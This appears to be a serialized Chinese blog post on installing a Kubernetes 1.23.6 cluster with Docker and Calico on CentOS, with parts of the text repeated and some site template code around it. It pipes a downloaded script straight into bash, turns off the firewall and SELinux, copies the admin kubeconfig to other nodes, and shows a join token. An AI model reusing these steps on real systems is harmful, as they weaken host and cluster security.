class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kubeadm init \\</span><br><span class=\"line\">--kubernetes-version 1.23.6 \\</span><br><span class=\"line\">--apiserver-advertise-address=192.168.229.130 \\</span><br><span class=\"line\">--service-cidr=10.96.0.0/12 \\</span><br><span class=\"line\">--pod-network-cidr=10.244.0.0/16 \\</span><br><span class=\"line\">--image-repository registry.aliyuncs.com/google_containers</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>kubernetes-version 集群版本</li>\n<li>apiserver-advertise-address API服务器通告地址，即k8s主节点。</li>\n<li>service-cidr 服务网段</li>\n<li>pod-network-cidr Pod网段</li>\n<li>image-repository 镜像仓库</li>\n</ul>\n<p>这一步会产生很多奇奇怪怪的问题，但是如果是按照我这个步骤和版本安装下来的，估计是不会出问题的。安装完事之后如果看到如下输出，说明安装成功了。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kubeadm <span class=\"built_in\">join</span> 192.168.229.130:6443 --token iks8xq.pqnnn0uvotgtloyj \\</span><br><span class=\"line\">--discovery-token-ca-cert-hash</span><br><span class=\"line\">sha256:674a06791e7637efccdaf9874346d0815a6f864a29670acccaa2aa1c998e2ef4 </span><br></pre></td></tr></table></figure>\n\n<h4 id=\"配置kubectl\"><a href=\"#配置kubectl\" class=\"headerlink\" title=\"配置kubectl\"></a>配置kubectl</h4><p>不要清屏，按照上面的提示，依次执行他给出来的命令。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">mkdir</span> -p <span class=\"variable\">$HOME</span>/.kube</span><br><span class=\"line\">sudo <span class=\"built_in\">cp</span> -i /etc/kubernetes/admin.conf <span class=\"variable\">$HOME</span>/.kube/config</span><br><span class=\"line\">sudo <span class=\"built_in\">chown</span> $(<span class=\"built_in\">id</span> -u):$(<span class=\"built_in\">id</span> -g) <span class=\"variable\">$HOME</span>/.kube/config</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"节点加入集群\"><a href=\"#节点加入集群\" class=\"headerlink\" title=\"节点加入集群\"></a>节点加入集群</h4><p>如果还留着提示，直接复制他给出的<code>kubeadm join</code>命令，然后执行即可。如果丢了，需要手动查看一下两个参数，<code>--token</code>和<code>--discovery-token-ca-cert-hash</code>。</p>\n<p>token可以使用如下命令查看，比如是“xxxxxx”。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kubeadm token list</span><br></pre></td></tr></table></figure>\n\n<p>discovery-token-ca-cert-hash可以使用如下命令查看，比如是“yyyyyy”。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">openssl x509 -pubkey -<span class=\"keyword\">in</span> /etc/kubernetes/pki/ca.crt | openssl rsa -pubin -outform der 2&gt; /dev/null | openssl dgst -sha256 -hex | sed <span class=\"string\">&#x27;s/^.* //&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>然后给他们组合到一块</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kubeadm <span class=\"built_in\">join</span> 192.168.229.130:6443 --token xxxxxx \\</span><br><span class=\"line\">--discovery-token-ca-cert-hash sha256:yyyyyy</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"安装网络插件CNI\"><a href=\"#安装网络插件CNI\" class=\"headerlink\" title=\"安装网络插件CNI\"></a>安装网络插件CNI</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">mkdir</span> /opt/k8s &amp;&amp; <span class=\"built_in\">cd</span> /opt/k8s</span><br><span class=\"line\">curl https://calico-v3-25.netlify.app/archive/v3.25/manifests/calico.yaml -O</span><br></pre></td></tr></table></figure>\n\n<p>这个时我们就下载了一个文件名字叫：calico.yaml，但是这个文件需要改一下cidr。这里的cidr就是我们初始化时候<code>--pod-network-cidr</code>字段的cidr。</p>\n<p>vim calico.yaml，搜索“CALICO_IPV4POOL_CIDR”。</p>\n<p><img src=\"/2024/03/25/install-k8s/1.png\" alt=\"修改配置文件\"></p>\n<h4 id=\"下载calico-yaml文件里描述的镜像\"><a href=\"#下载calico-yaml文件里描述的镜像\" class=\"headerlink\" title=\"下载calico.yaml文件里描述的镜像\"></a>下载calico.yaml文件里描述的镜像</h4><p>calico.yaml 里面用的都是docker.io的镜像，你可以先使用<code>grep image calico.yaml</code>命令查看一下。然后我们做一下修改，执行以下命令：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sed -i <span class=\"string\">&#x27;s#docker.io/##g&#x27;</span> calico.yaml </span><br></pre></td></tr></table></figure>\n\n<p>完事后你也可以再验证一下：<code>grep image calico.yaml</code>。然后kubectl apply一下：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kubectl apply -f calico.yaml</span><br></pre></td></tr></table></figure>\n\n<p>这个时候kebe就会自己去下载镜像了，不会前台显示，下载速度取决于你的网速。但是你可以通过<code>kubectl get pods -n kube-system</code>命令查看一下，如果镜像下载完了，就会看到如下输出，所有容器都是运行起来的：</p>\n<p><img src=\"/2024/03/25/install-k8s/2.png\" alt=\"下载验证\"></p>\n<p>这样就完成了K8S的安装。</p>\n<h4 id=\"验证\"><a href=\"#验证\" class=\"headerlink\" title=\"验证\"></a>验证</h4><p>我们可以去运行一个nginx实例，去看看到底还有没有什么问题。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kubectl create deployment nginx --image=nginx</span><br><span class=\"line\">kubectl expose deployment nginx --port=80 --<span class=\"built_in\">type</span>=NodePort</span><br><span class=\"line\">kubectl get pod,svc</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/03/25/install-k8s/3.png\" alt=\"验证kube\"></p>\n<p>在宿主机上访问节点IP:port。</p>\n<p><img src=\"/2024/03/25/install-k8s/4.png\" alt=\"验证kube\"></p>\n<h3 id=\"其他高级配置\"><a href=\"#其他高级配置\" class=\"headerlink\" title=\"其他高级配置\"></a>其他高级配置</h3><h4 id=\"配置在其他节点的控制\"><a href=\"#配置在其他节点的控制\" class=\"headerlink\" title=\"配置在其他节点的控制\"></a>配置在其他节点的控制</h4><p>这个就是说在任何节点上都可以对k8s的API-server进行访问，对节点进行管理。换言之，你不配置这一步，你只能在主节点进行<code>kubectl get nodes</code>命令，其他节点执行不了。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">scp /etc/kubernetes/admin.conf root@k8s-nd1:/etc/kubernetes</span><br><span class=\"line\">scp /etc/kubernetes/admin.conf root@k8s-nd2:/etc/kubernetes</span><br></pre></td></tr></table></figure>\n\n<p>拷贝过去之后，分别在两个节点上执行如下命令：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;export KUBECONFIG=/etc/kubernetes/admin.conf&quot;</span> &gt;&gt; ~/.bash_profile</span><br><span class=\"line\"><span class=\"built_in\">source</span> ~/.bash_profile</span><br><span class=\"line\">kubectl get node</span><br></pre></td></tr></table></figure>\n\n<p>如果显示有效内容，说明配置成功了。</p>\n<h4 id=\"配置kubectl命令自动补全\"><a href=\"#配置kubectl命令自动补全\" class=\"headerlink\" title=\"配置kubectl命令自动补全\"></a>配置kubectl命令自动补全</h4><p>初始配置K8S是不能进行命令补全的，使用起来太麻烦，尤其是对于我这个<kbd>Tab</kbd>键重度使用者，实在太不爽。下面是配置K8S命令补全的方法：</p>\n<blockquote>\n<p>一般在master节点执行就可以满足需求，但是如果有需求，也可以在worker节点上配置。</p>\n</blockquote>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install -y bash-completion</span><br><span class=\"line\"><span class=\"built_in\">source</span> /usr/share/bash-completion/bash_completion</span><br><span class=\"line\"><span class=\"built_in\">source</span> &lt;(kubectl completion bash)</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;source &lt;(kubectl completion bash)&quot;</span> &gt;&gt; ~/.bashrc</span><br></pre></td></tr></table></figure>","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<p>简单玩了一下K8S，安装也太费劲了，一大堆坑，浅浅记录一下吧。</p>\n<h3 id=\"安装环境\"><a href=\"#安装环境\" class=\"headerlink\" title=\"安装环境\"></a>安装环境</h3><ol>\n<li>CentOS Stream release 8</li></ol>","more":"\n<li>K8S v1.23.6</li>\n<li>Docker version 26.0.0, build 2ae903e</li>\n\n<table>\n<thead>\n<tr>\n<th align=\"center\">主机名</th>\n<th align=\"center\">IP</th>\n<th align=\"center\">CPU</th>\n<th align=\"center\">内存</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">k8s-mst</td>\n<td align=\"center\">192.168.229.130</td>\n<td align=\"center\">4</td>\n<td align=\"center\">8G</td>\n</tr>\n<tr>\n<td align=\"center\">k8s-nd1</td>\n<td align=\"center\">192.168.229.131</td>\n<td align=\"center\">4</td>\n<td align=\"center\">4G</td>\n</tr>\n<tr>\n<td align=\"center\">k8s-nd2</td>\n<td align=\"center\">192.168.229.132</td>\n<td align=\"center\">4</td>\n<td align=\"center\">4G</td>\n</tr>\n</tbody></table>\n<h3 id=\"安装步骤\"><a href=\"#安装步骤\" class=\"headerlink\" title=\"安装步骤\"></a>安装步骤</h3><blockquote>\n<p>下面的步骤2.1-2.8，是需要在三台虚拟机上都执行的；2.9-2.10只在master主机执行即可；2.11在所有节点主机执行即可；2.12-2.14在master主机执行即可。</p>\n</blockquote>\n<h4 id=\"基础操作\"><a href=\"#基础操作\" class=\"headerlink\" title=\"基础操作\"></a>基础操作</h4><p>下面的操作代表的含义依次是：关闭防火墙、关闭selinux、关闭swap分区</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systemctl stop firewalld &amp;&amp; systemctl <span class=\"built_in\">disable</span> firewalld &amp;&amp; iptables -F</span><br><span class=\"line\">sed -i <span class=\"string\">&#x27;s/enforcing/disabled/&#x27;</span> /etc/selinux/config &amp;&amp; setenforce 0</span><br><span class=\"line\">swapoff -a</span><br><span class=\"line\">sed -ri <span class=\"string\">&#x27;s/.*swap.*/#&amp;/&#x27;</span> /etc/fstab</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"分别修改各主机的主机名\"><a href=\"#分别修改各主机的主机名\" class=\"headerlink\" title=\"分别修改各主机的主机名\"></a>分别修改各主机的主机名</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hostnamectl set-hostname k8s-mst</span><br><span class=\"line\">hostnamectl set-hostname k8s-nd1</span><br><span class=\"line\">hostnamectl set-hostname k8s-nd2</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"修改各主机的hosts文件\"><a href=\"#修改各主机的hosts文件\" class=\"headerlink\" title=\"修改各主机的hosts文件\"></a>修改各主机的hosts文件</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">192.168.229.130 k8s-mst</span><br><span class=\"line\">192.168.229.131 k8s-nd1</span><br><span class=\"line\">192.168.229.132 k8s-nd2</span><br></pre></td></tr></table></figure>\n\n<p>利用 <code>scp</code> 命令将 <code>/etc/hosts</code> 文件复制到其他主机</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">scp /etc/hosts k8s-nd1:/etc/hosts</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"修改内核参数\"><a href=\"#修改内核参数\" class=\"headerlink\" title=\"修改内核参数\"></a>修改内核参数</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cat</span> &gt; /etc/sysctl.d/k8s.conf &lt;&lt; <span class=\"string\">EOF</span></span><br><span class=\"line\"><span class=\"string\">net.bridge.bridge-nf-call-ip6tables = 1</span></span><br><span class=\"line\"><span class=\"string\">net.bridge.bridge-nf-call-iptables = 1</span></span><br><span class=\"line\"><span class=\"string\">net.ipv4.ip_forward = 1</span></span><br><span class=\"line\"><span class=\"string\">EOF</span></span><br><span class=\"line\"></span><br><span class=\"line\">sysctl --system</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"安装Docker\"><a href=\"#安装Docker\" class=\"headerlink\" title=\"安装Docker\"></a><a href=\"https://nustarain.gitee.io/2023/10/30/DockerInit\">安装Docker</a></h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl -fsSL https://get.docker.com | bash -s docker</span><br></pre></td></tr></table></figure>\n\n<p>如果要适配K8S，需要对Docker的daemon.json文件进行升级，配置如下：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cat</span> &gt; /etc/docker/daemon.json &lt;&lt; <span class=\"string\">EOF</span></span><br><span class=\"line\"><span class=\"string\">&#123;</span></span><br><span class=\"line\"><span class=\"string\">&quot;registry-mirrors&quot;: [&quot;https://gqs7xcfd.mirror.aliyuncs.com&quot;,&quot;https://hub-mirror.c.163.com&quot;],</span></span><br><span class=\"line\"><span class=\"string\">&quot;exec-opts&quot;: [&quot;native.cgroupdriver=systemd&quot;],</span></span><br><span class=\"line\"><span class=\"string\">&quot;log-driver&quot;: &quot;json-file&quot;,</span></span><br><span class=\"line\"><span class=\"string\">&quot;log-opts&quot;: &#123;</span></span><br><span class=\"line\"><span class=\"string\">&quot;max-size&quot;: &quot;100m&quot;</span></span><br><span class=\"line\"><span class=\"string\">&#125;,</span></span><br><span class=\"line\"><span class=\"string\">&quot;storage-driver&quot;: &quot;overlay2&quot;</span></span><br><span class=\"line\"><span class=\"string\">&#125;</span></span><br><span class=\"line\"><span class=\"string\">EOF</span></span><br></pre></td></tr></table></figure>\n\n<p>启动Docker服务</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systemctl daemon-reload &amp;&amp; systemctl <span class=\"built_in\">enable</span> --now docker</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"配置K8S的yum源\"><a href=\"#配置K8S的yum源\" class=\"headerlink\" title=\"配置K8S的yum源\"></a>配置K8S的yum源</h4><p>需要自己添加一个用于下载K8S的yum源，这里我使用的是阿里云的源。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cat</span> &gt; /etc/yum.repos.d/kubernetes.repo &lt;&lt; <span class=\"string\">EOF</span></span><br><span class=\"line\"><span class=\"string\">[kubernetes]</span></span><br><span class=\"line\"><span class=\"string\">name=Kubernetes</span></span><br><span class=\"line\"><span class=\"string\">baseurl=https://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64/</span></span><br><span class=\"line\"><span class=\"string\">enabled=1</span></span><br><span class=\"line\"><span class=\"string\">gpgcheck=1</span></span><br><span class=\"line\"><span class=\"string\">repo_gpgcheck=1</span></span><br><span class=\"line\"><span class=\"string\">gpgkey=https://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpg https://mirrors.aliyun.com/kubernetes/yum/doc/rpm-package-key.gpg</span></span><br><span class=\"line\"><span class=\"string\">EOF</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"安装K8S\"><a href=\"#安装K8S\" class=\"headerlink\" title=\"安装K8S\"></a>安装K8S</h4><p>1.24.X 版本都不再兼容Docker，所以还是使用1.23.X版本。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install -y kubelet-1.23.6 kubeadm-1.23.6 kubectl-1.23.6</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"启动K8S服务\"><a href=\"#启动K8S服务\" class=\"headerlink\" title=\"启动K8S服务\"></a>启动K8S服务</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systemctl <span class=\"built_in\">enable</span> --now kubelet</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"初始化K8S集群\"><a href=\"#初始化K8S集群\" class=\"headerlink\" title=\"初始化K8S集群\"></a>初始化K8S集群</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kubeadm init \\</span><br><span class=\"line\">--kubernetes-version 1.23.6 \\</span><br><span class=\"line\">--apiserver-advertise-address=192.168.229.130 \\</span><br><span class=\"line\">--service-cidr=10.96.0.0/12 \\</span><br><span class=\"line\">--pod-network-cidr=10.244.0.0/16 \\</span><br><span class=\"line\">--image-repository registry.aliyuncs.com/google_containers</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>kubernetes-version 集群版本</li>\n<li>apiserver-advertise-address API服务器通告地址，即k8s主节点。</li>\n<li>service-cidr 服务网段</li>\n<li>pod-network-cidr Pod网段</li>\n<li>image-repository 镜像仓库</li>\n</ul>\n<p>这一步会产生很多奇奇怪怪的问题，但是如果是按照我这个步骤和版本安装下来的，估计是不会出问题的。安装完事之后如果看到如下输出，说明安装成功了。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kubeadm <span class=\"built_in\">join</span> 192.168.229.130:6443 --token iks8xq.pqnnn0uvotgtloyj \\</span><br><span class=\"line\">--discovery-token-ca-cert-hash</span><br><span class=\"line\">sha256:674a06791e7637efccdaf9874346d0815a6f864a29670acccaa2aa1c998e2ef4 </span><br></pre></td></tr></table></figure>\n\n<h4 id=\"配置kubectl\"><a href=\"#配置kubectl\" class=\"headerlink\" title=\"配置kubectl\"></a>配置kubectl</h4><p>不要清屏，按照上面的提示，依次执行他给出来的命令。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">mkdir</span> -p <span class=\"variable\">$HOME</span>/.kube</span><br><span class=\"line\">sudo <span class=\"built_in\">cp</span> -i /etc/kubernetes/admin.conf <span class=\"variable\">$HOME</span>/.kube/config</span><br><span class=\"line\">sudo <span class=\"built_in\">chown</span> $(<span class=\"built_in\">id</span> -u):$(<span class=\"built_in\">id</span> -g) <span class=\"variable\">$HOME</span>/.kube/config</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"节点加入集群\"><a href=\"#节点加入集群\" class=\"headerlink\" title=\"节点加入集群\"></a>节点加入集群</h4><p>如果还留着提示，直接复制他给出的<code>kubeadm join</code>命令，然后执行即可。如果丢了，需要手动查看一下两个参数，<code>--token</code>和<code>--discovery-token-ca-cert-hash</code>。</p>\n<p>token可以使用如下命令查看，比如是“xxxxxx”。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kubeadm token list</span><br></pre></td></tr></table></figure>\n\n<p>discovery-token-ca-cert-hash可以使用如下命令查看，比如是“yyyyyy”。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">openssl x509 -pubkey -<span class=\"keyword\">in</span> /etc/kubernetes/pki/ca.crt | openssl rsa -pubin -outform der 2&gt; /dev/null | openssl dgst -sha256 -hex | sed <span class=\"string\">&#x27;s/^.* //&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>然后给他们组合到一块</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kubeadm <span class=\"built_in\">join</span> 192.168.229.130:6443 --token xxxxxx \\</span><br><span class=\"line\">--discovery-token-ca-cert-hash sha256:yyyyyy</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"安装网络插件CNI\"><a href=\"#安装网络插件CNI\" class=\"headerlink\" title=\"安装网络插件CNI\"></a>安装网络插件CNI</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">mkdir</span> /opt/k8s &amp;&amp; <span class=\"built_in\">cd</span> /opt/k8s</span><br><span class=\"line\">curl https://calico-v3-25.netlify.app/archive/v3.25/manifests/calico.yaml -O</span><br></pre></td></tr></table></figure>\n\n<p>这个时我们就下载了一个文件名字叫：calico.yaml，但是这个文件需要改一下cidr。这里的cidr就是我们初始化时候<code>--pod-network-cidr</code>字段的cidr。</p>\n<p>vim calico.yaml，搜索“CALICO_IPV4POOL_CIDR”。</p>\n<p><img src=\"/2024/03/25/install-k8s/1.png\" alt=\"修改配置文件\"></p>\n<h4 id=\"下载calico-yaml文件里描述的镜像\"><a href=\"#下载calico-yaml文件里描述的镜像\" class=\"headerlink\" title=\"下载calico.yaml文件里描述的镜像\"></a>下载calico.yaml文件里描述的镜像</h4><p>calico.yaml 里面用的都是docker.io的镜像，你可以先使用<code>grep image calico.yaml</code>命令查看一下。然后我们做一下修改，执行以下命令：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sed -i <span class=\"string\">&#x27;s#docker.io/##g&#x27;</span> calico.yaml </span><br></pre></td></tr></table></figure>\n\n<p>完事后你也可以再验证一下：<code>grep image calico.yaml</code>。然后kubectl apply一下：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kubectl apply -f calico.yaml</span><br></pre></td></tr></table></figure>\n\n<p>这个时候kebe就会自己去下载镜像了，不会前台显示，下载速度取决于你的网速。但是你可以通过<code>kubectl get pods -n kube-system</code>命令查看一下，如果镜像下载完了，就会看到如下输出，所有容器都是运行起来的：</p>\n<p><img src=\"/2024/03/25/install-k8s/2.png\" alt=\"下载验证\"></p>\n<p>这样就完成了K8S的安装。</p>\n<h4 id=\"验证\"><a href=\"#验证\" class=\"headerlink\" title=\"验证\"></a>验证</h4><p>我们可以去运行一个nginx实例，去看看到底还有没有什么问题。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kubectl create deployment nginx --image=nginx</span><br><span class=\"line\">kubectl expose deployment nginx --port=80 --<span class=\"built_in\">type</span>=NodePort</span><br><span class=\"line\">kubectl get pod,svc</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/03/25/install-k8s/3.png\" alt=\"验证kube\"></p>\n<p>在宿主机上访问节点IP:port。</p>\n<p><img src=\"/2024/03/25/install-k8s/4.png\" alt=\"验证kube\"></p>\n<h3 id=\"其他高级配置\"><a href=\"#其他高级配置\" class=\"headerlink\" title=\"其他高级配置\"></a>其他高级配置</h3><h4 id=\"配置在其他节点的控制\"><a href=\"#配置在其他节点的控制\" class=\"headerlink\" 